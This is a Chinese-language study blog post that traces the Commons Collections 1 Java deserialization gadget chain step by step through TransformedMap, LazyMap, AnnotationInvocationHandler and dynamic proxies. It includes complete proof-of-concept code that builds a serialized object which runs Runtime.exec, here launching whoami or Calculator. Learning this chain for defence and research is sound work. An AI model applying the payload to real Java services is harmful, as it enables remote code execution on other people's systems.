# [Java安全] CommonsCollections1链分析


前面写了很多，现在终于到大名鼎鼎的CC链了，这里我还是跟P牛的《Java安全漫谈》来对CC链进行分析学习

# CommonCollection1

## 前菜

首先P牛帮我们简化CC链成如下代码

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.util.HashMap;
import java.util.Map;


public class easycc1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"whoami"}),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
        outerMap.put("test", "xxxx");
    }
}
```

### Transformed

Transformed是一个接口，他只有一个待实现的方法

```java
package org.apache.commons.collections;

public interface Transformer {
    Object transform(Object var1);
}
```

### ConstantTransformer

ConstantTransformer在CommonCollection里，是实现了Transformer接口的一个类

它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回

```java
public class ConstantTransformer implements Transformer, Serializable {
    static final long serialVersionUID = 6374440726369055124L;
    public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null);
    private final Object iConstant;

    public static Transformer getInstance(Object constantToReturn) {
        return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn));
    }

    public ConstantTransformer(Object constantToReturn) {
        this.iConstant = constantToReturn;
    }

    public Object transform(Object input) {
        return this.iConstant;
    }

    public Object getConstant() {
        return this.iConstant;
    }
}
```

**疑问1：这个有啥用，为什么要传入一个对象，然后原封不动的传回来**

### InvokerTransformer

InvokerTransformer也是CommonCollection中实现了Transformer接⼝的⼀个类

他的参数有三个，第一个是待执行的方法名，第二个是这个函数的参数列表的类型，第三个则是传给这个方法的参数

在后面的transform方法中，就执⾏了input对象的iMethodName⽅法

```java
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
        this.iMethodName = methodName;
        this.iParamTypes = paramTypes;
        this.iArgs = args;
    }

    public Object transform(Object input) {
        if (input == null) {
            return null;
        } else {
            try {
                Class cls = input.getClass();
                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                return method.invoke(input, this.iArgs);
            } catch (NoSuchMethodException var5) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
            } catch (IllegalAccessException var6) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
            } catch (InvocationTargetException var7) {
                throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
            }
        }
    }
```

**疑问2：其实看到这里，我就在想得怎么去执行这个transform函数，接下来的这个ChainedTransformer就解决了我的疑惑**

### ChainedTransformer

ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的transform方法的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，这里p牛画了一个图很直观

![image-20220929181721939](https://tuchuang.huamang.xyz/img/image-20220929181721939.png)

实现也很简单，利用构造方法传入一个数组，然后for循环这里，也就是**让前一个对象的回调结果作为下一个对象的transform方法的参数**，这就解决了我的**疑问2**

```java
    public ChainedTransformer(Transformer[] transformers) {
        this.iTransformers = transformers;
    }

    public Object transform(Object object) {
        for(int i = 0; i < this.iTransformers.length; ++i) {
            object = this.iTransformers[i].transform(object);
        }

        return object;
    }
```

**这里就解决了我的疑问1，因为在这个ChainedTransformer类里面的transform方法里面，可以让我们进行一个连接，让前一个对象的回调结果作为下一个对象的transform方法的参数，所以我们使用ConstantTransformer来包住我们想要加载的对象，在执行ConstantTransformer的transform后得以作为input传给InvokerTransformer去执行函数`method.invoke(input, this.iArgs)`**



**疑问3：那我ChainedTransformer的transform又得怎么执行呢，是由下面介绍的TransformedMap来**

### TransformedMap

TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在**添加新的元素时将可以执⾏⼀个回调**。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：

```java
Map outerMap = TransformedMap.decorate(innerMap, keyTransformer,
valueTransformer);
```

跟进源码去分析

其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了**Transformer接⼝的类**。

```java
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
    return new TransformedMap(map, keyTransformer, valueTransformer);
}
```

然后前面说我们对修饰过的Map添加新元素的时候会执行一个回调，在这里也就是一个put函数，我们跟进去看看，这个put方法会对键和值分别执行`transformKey`和`transformValue`

```java
    public Object put(Object key, Object value) {
        key = this.transformKey(key);
        value = this.transformValue(value);
        return this.getMap().put(key, value);
    }
```

然后我们再跟进`transformValue`去看看，可以发现是执行了`transform`函数的，完成了一次回调

```
    protected Object transformValue(Object object) {
        return this.valueTransformer == null ? object : this.valueTransformer.transform(object);
    }
```

### 调试分析

介绍完了这几个Transform，接下来就可以来走这个链子了，这里我调试来跟着走一遍

首先创建transformers数组：

第一个是`ConstantTransformer`对象，传入的是Runtime对象

第二个是`InvokerTransformer`对象，传入的是执行的exec方法和他的参数

```java
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
        };
```

然后是`ChainedTransformer`，把这个数组传进去，赋值给ChainedTransformer的ITransformers

![image-20220929191549179](https://tuchuang.huamang.xyz/img/image-20220929191549179.png)

然后就是`TransformedMap.decorate()`，先创建一个Map，然后把map传入作为被修饰的Map

```java
Map innerMap = new HashMap();
Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
```

把我们的ChainedTransformer对象传进去作为处理新元素的value的回调`valueTransformer`

![image-20220929193129061](https://tuchuang.huamang.xyz/img/image-20220929193129061.png)

这样我们的Map就算是被TransformedMap修饰好了，输出`outerMap`，下一步就是为这个Map插入一个元素去触发我们的ChainedTransformer对象的transform方法

```java
outerMap.put("test", "xxxx");
```

在更新value的时候，触发`valueTransformer`也就是我们的ChainedTransformer对象的transform方法

![image-20220929193401459](https://tuchuang.huamang.xyz/img/image-20220929193401459.png)

然后就进入到了这个循环

```java
public Object transform(Object object) {
    for(int i = 0; i < this.iTransformers.length; ++i) {
        object = this.iTransformers[i].transform(object);
    }

    return object;
}
```

此时的object是我们传入的新value，就是个随便的字符串对象，而此时的`iTransformers[i]`是我们前面传入的数组的第一个元素，也就是`ConstantTransformer(Runtime.getRuntime())`，这里就调用了他的transform函数，不管输入，直接返回之前存在里面的对象

```java
public Object transform(Object input) {
		return this.iConstant;
}
```

那么此时的object就被赋值为Runtime对象了，然后进入下一层循环，此时`iTransformers[i]`变成了之前定义的数组的第二个元素

```java
InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"})
```

把Runtime对象传入，执行他的transform函数，完成RCE

![image-20220929194924740](https://tuchuang.huamang.xyz/img/image-20220929194924740.png)

## CC1

前面理解了p牛所做的简易版的CC链，现在就开始进行真正的CC链的分析了

在前面的demo中，我们手动进行了`outerMap.put("test", "xxxx");`去触发的漏洞，但是正常环境中，我们进行反序列化的时候如何触发字典的插入操作呢，我们就得去找到一个类，他重写的`readObject`进行反序列化的时候会执行这样的写入操作，这个类就是`sun.reflect.annotation.AnnotationInvocationHandler`

### AnnotationInvocationHandler

注意我们分析的是**8u71以前**的代码，这里我jdk用的是**8u65**，我们直奔他的readObject方法

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        var1.defaultReadObject();
        AnnotationType var2 = null;

        try {
            var2 = AnnotationType.getInstance(this.type);
        } catch (IllegalArgumentException var9) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var3 = var2.memberTypes();
        Iterator var4 = this.memberValues.entrySet().iterator();

        while(var4.hasNext()) {
            Entry var5 = (Entry)var4.next();
            String var6 = (String)var5.getKey();
            Class var7 = (Class)var3.get(var6);
            if (var7 != null) {
                Object var8 = var5.getValue();
                if (!var7.isInstance(var8) && !(var8 instanceof ExceptionProxy)) {
                    var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + "[" + var8 + "]")).setMember((Method)var2.members().get(var6)));
                }
            }
        }

    }
```

核心点在这：

`memberValues`就是反序列化后得到的Map，也是经过了`TransformedMap`修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用`setValue`设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们前面所展示的链子

```java
Iterator var4 = this.memberValues.entrySet().iterator();
Entry var5 = (Entry)var4.next();
var5.setValue()
```

所以现在我们就来构造我们的POC

### POC构造

首先就是AnnotationInvocationHandler对象的创建，因为这个是jdk内部的类，是不能直接new获取的，所以得用反射来获取

```java
Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
construct.setAccessible(true);
InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
ByteArrayOutputStream barr = new ByteArrayOutputStream();
ObjectOutputStream oos = new ObjectOutputStream(barr);
oos.writeObject(handler);
oos.close();
System.out.println(barr);
ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
Object o = (Object)ois.readObject();
```

然后是这里的`newInstance`获取对象了，首先我们去看看AnnotationInvocationHandler的构造方法，这里是要传两个参数的，第一个参数是`Class<? extends Annotation> var1`，第二个参数是Map

```java
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
```

他的第一个参数必须是Annotation的子类，这里其实是有很多的，但是为什么选`Retention`

首先我们看到最后readObject这里，在最后set这，是有一个判断条件的

```
if (var7 != null)
```

这里我调试了很久，但是还是没弄懂，看p牛的文章中是这样说的

>那么如何让这个var7不为null呢？这一块我就不详细分析了，还会涉及到Java注释相关的技术。直接给 出两个条件：
>
>1. sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 
>2. 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素 
>
>所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素：

#### Runtime

但是发现这样还是不能执行命令的，这里报错了，原因是Runtime是不能被反序列化的，我们最早传给ConstantTransformer的是 `Runtime.getRuntime()` ，而Runtime没有实现serializable接口，是不能被序列化的

![image-20220930021727592](https://tuchuang.huamang.xyz/img/image-20220930021727592.png)

那么我们的解决办法还是有的，我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，因为我们的`ChainedTransformer`的存在，我们可以在数组中把Runtime的反射分开填装进去，就像这样

原poc

```java
Method f = Runtime.class.getMethod("getRuntime");
Runtime r = (Runtime) f.invoke(null);
r.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
```

转换成这样，InvokerTransformer的第一个参数表示要执行的方法，第二个参数表示参数类型，第三个参数作为执行参数列表，需要去匹配第二个参数

```java
Transformer[] transformers = new Transformer[] {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
    new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
    new InvokerTransformer("exec", new Class[] { String.class },new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" }),
};
```

以前的Runtime.getRuntime() 是`java.lang.Runtime`对象，无法序列化，现在变成了Runtime.class，是java.lang.Class 对象，Class类有实现Serializable接口，所以可以被序列化

这里我们跟一下，仔细的弄清楚这个操作：



**第一次循环**

`iTransformers[0] = ConstantTransformer(Runtime.class)`
object不重要不影响

![image-20220930141338876](https://tuchuang.huamang.xyz/img/image-20220930141338876.png)

**第二次循环**

前面的ConstantTransformer(Runtime.class)执行了transform，返回**class java.lang.Runtime**，作为object

```java
iTransformers[1] = InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] })
```

进入InvokerTransformer的transform，input是**class java.lang.Runtime**，method是`getMethod`，参数iArgs是`{"getRuntime",new Class[0]}`，

```
return method.invoke(input, this.iArgs);
返回：public static java.lang.Runtime java.lang.Runtime.getRuntime()
```

其实就等价于

```
Runtime.class.getMethod("getRuntime",new Class[0])
```

**第三次循环**

object为getRuntime方法

```java
iTransformers[1] = InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]})
```

同理的执行

![image-20220930142900541](https://tuchuang.huamang.xyz/img/image-20220930142900541.png)

等价于

```java
invoke.invoke(public static java.lang.Runtime java.lang.Runtime.getRuntime(),{ null, new Object[0]})
```

返回了我们千呼万唤的Runtime对象

**第四次循环**

现在我们通过反射已经拿到了Runtime对象了，接下来就是执行Runtime的exec了

这个就不多说，前面已经分析过了

#### Retention

~~Java注释相关的技术还不太懂，这里有师傅分析过：https://xz.aliyun.com/t/9873~~

没分析完整，心里一直过不去，所以到第二天还是老老实实跟了一遍这里

我们关注这个点的起始点，就在readObject中的这么一段代码

```
if (var7 != null)
```

首先我们构造这个AnnotationInvocationHandler对象的时候，var1我们传入的是Retention.class，var2传入的是我们构造的TransformedMap

```java
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
```

var1会被赋值给`this.type`，var2会被赋值给`this.memberValues`

在反序列化的时候，进入readObject方法，执行了这么一段代码

```java
var2 = AnnotationType.getInstance(this.type);
```

我们跟进AnnotationType.getInstance，传入的参数是this.type也就是Retention.class

```java
public static AnnotationType getInstance(Class<? extends Annotation> var0) {
        JavaLangAccess var1 = SharedSecrets.getJavaLangAccess();
        AnnotationType var2 = var1.getAnnotationType(var0);
        if (var2 == null) {
            var2 = new AnnotationType(var0);
            if (!var1.casAnnotationType(var0, (AnnotationType)null, var2)) {
                var2 = var1.getAnnotationType(var0);

                assert var2 != null;
            }
        }

        return var2;
    }
```

这里会进入到 `new AnnotationType(var0);`，然后继续往下走，此时的var2的值就是Retention的方法列表，Retention只有一个方法那就是value()

![image-20220930133338320](https://tuchuang.huamang.xyz/img/image-20220930133338320.png)

我们再往下跟，var2传递到var3，然后就进入循环，这里循环把方法列表var3中的方法取出存在var6

然后再执行`String var7 = var6.getName();`，获取方法名存在var7中

![image-20220930135719053](https://tuchuang.huamang.xyz/img/image-20220930135719053.png)

然后再put作为键值存入memberTypes

走出这个方法，可以看到var2的memberTypes是个HashMap，他的第一个元素的键值就是Retention的方法value的字符串

![image-20220930135943513](https://tuchuang.huamang.xyz/img/image-20220930135943513.png)

然后再回到readObject，这里var2出来以后，他的memberTypes赋值给了var3

![image-20220930140202901](https://tuchuang.huamang.xyz/img/image-20220930140202901.png)

继续往下，var6是var5的key，也就是“value”，终于走到var7

`var7=var3.get("value")`

刚好我们var3的键就是value，所以var7不会为null，就执行了我们想要的setValue了

![image-20220930140650215](https://tuchuang.huamang.xyz/img/image-20220930140650215.png)

至此，CommonCollection1利用链我们就已经分析结束了



# LazyMap

观察ysoserial中的CC1的payload，可以发现这里用的不是我们上一篇文章介绍到的TransformedMap而是LazyMap

![image-20220930152414864](https://tuchuang.huamang.xyz/img/image-20220930152414864.png)

那我们先来研究一下这个LazyMap

LazyMap和TransformedMap的区别在于，TransformedMap触发transform的地方在于Map的写入操作，LazyMap触发transform的操作是在他的get方法中执行`this.factory.transform(key);`

```java
    public Object get(Object key) {
        if (!super.map.containsKey(key)) {
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        } else {
            return super.map.get(key);
        }
    }
```

而且factory是可控的

```java
    public static Map decorate(Map map, Transformer factory) {
        return new LazyMap(map, factory);
    }

    protected LazyMap(Map map, Transformer factory) {
        super(map);
        if (factory == null) {
            throw new IllegalArgumentException("Factory must not be null");
        } else {
            this.factory = factory;
        }
    }
```

我们要使用的话只需要把Map和transformerChain传入即可

```
Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
```

但是这样一来，我们之前的AnnotationInvocationHandler的readObject就不行了，这里我们看看ysoserial的Gadget

```java
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
```

可以看到这里是用的一个`AnnotationInvocationHandler.invoke()`

![image-20220930171136527](https://tuchuang.huamang.xyz/img/image-20220930171136527.png)

那么现在的问题就是如何调用到这个invoke方法了，可以看到gadget写的是Proxy，这里就涉及到一个Java的技术：**动态代理**

# 动态代理

动态代理的其实很好理解，首先我们知道接口interface是不能直接被实例化的，而是用一个class去实现他，然后实例化类来操作的，那么有一种，不编写实现类，直接在运行期创建某个`interface`实例的技术，他就叫做动态代理

那么要创建一个interface实例的方法就是如下所示：

1. 定义一个`InvocationHandler`实例，它负责实现接口的方法调用
2. 通过`Proxy.newProxyInstance()`创建interface实例，它需要3个参数：
	1. 使用的`ClassLoader`，通常就是接口类的`ClassLoader`
	2. 需要实现的接口数组，至少需要传入一个接口进去
	3. 用来处理接口方法调用的`InvocationHandler`实例
3. 将返回的`Object`强制转型为接口



我们用个例子来理解：

首先我们先实现InvocationHandler接口的invoke方法，invoke的作用就是当ProxyTest1对象执行函数的时候调用，所以这里的意思就是检测执行的方法为get的时候，输出一句Hacked

ProxyTest1.java

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Method;
import java.util.Map;

public class ProxyTest1 implements InvocationHandler {
    protected Map map;
    public ProxyTest1(Map map) {
        this.map = map;
    }
    @Override
    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {
        if(method.getName().compareTo("get")==0){
            System.out.println("Hacked");
        }
        return method.invoke(this.map,args);
    }
}
```

然后我们在外部调用ProxyTest1

ProxyTest2.java

```java
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class ProxyTest2 {
    public static void main(String args[]){
        InvocationHandler handler = new ProxyTest1(new HashMap());
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler);
        proxyMap.put("aaa","bbb");
        String res = (String) proxyMap.get("aaa");
        System.out.println(res);

    }

}
```

![image-20220930205142653](https://tuchuang.huamang.xyz/img/image-20220930205142653.png)

# LazyMap利用链构造

了解了动态代理，我们再回头看看，我们刚才是在想得怎么调用`AnnotationInvocationHandler.invoke()`，我们去翻源码会发现，其实他就是实现了InvocationHandler接口的，那就非常的巧了，我们如果用AnnotationInvocationHandler去代理我设计好的Map的话，那么这个Map执行任意的方法都会走进invoke从而进入我们构造好的链子了

![image-20220930210757525](https://tuchuang.huamang.xyz/img/image-20220930210757525.png)

所以我们可以这样开始写POC了，前面的都是没变的，TransformedMap换成LazyMap

然后用Proxy代理，但是不能直接拿去反序列化，因为我们要入口点是是`sun.reflect.annotation.AnnotationInvocationHandler#readObject`

所以还要用AnnotationInvocationHandler对这个proxyMap进行包裹

```java
handler = (InvocationHandler) construct.newInstance(Retention.class,
proxyMap);
```

最后的POC

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1pro {
    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {String.class, Class[].class }, new Object[] { "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}),
                new InvokerTransformer("exec", new Class[] { String.class }, new String[] {"/System/Applications/Calculator.app/Contents/MacOS/Calculator" }),
        };
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
        handler = (InvocationHandler) construct.newInstance(Retention.class,proxyMap);

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(handler);
        oos.close();
        System.out.println(barr);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();
    }

}
```

# 后记

前一篇文章说了，我们所测试的jdk版本是8u71以前的版本，而此版本以后的jdk，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject函数

变成了如下代码

```java
    private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException {
        GetField var2 = var1.readFields();
        Class var3 = (Class)var2.get("type", (Object)null);
        Map var4 = (Map)var2.get("memberValues", (Object)null);
        AnnotationType var5 = null;

        try {
            var5 = AnnotationType.getInstance(var3);
        } catch (IllegalArgumentException var13) {
            throw new InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map var6 = var5.memberTypes();
        LinkedHashMap var7 = new LinkedHashMap();

        String var10;
        Object var11;
        for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) {
            Entry var9 = (Entry)var8.next();
            var10 = (String)var9.getKey();
            var11 = null;
            Class var12 = (Class)var6.get(var10);
            if (var12 != null) {
                var11 = var9.getValue();
                if (!var12.isInstance(var11) && !(var11 instanceof ExceptionProxy)) {
                    var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + "[" + var11 + "]")).setMember((Method)var5.members().get(var10));
                }
            }
        }

        AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3);
        AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7);
    }
```

他让我们传入的Map不会再执行set或put操作了，所以这里就不能再用了

对于高版本的绕过，就在我们的下一篇文章CommonCollection6



参考文章：

Java安全漫谈

https://ego00.blog.csdn.net/article/details/119705730

https://xz.aliyun.com/t/9873

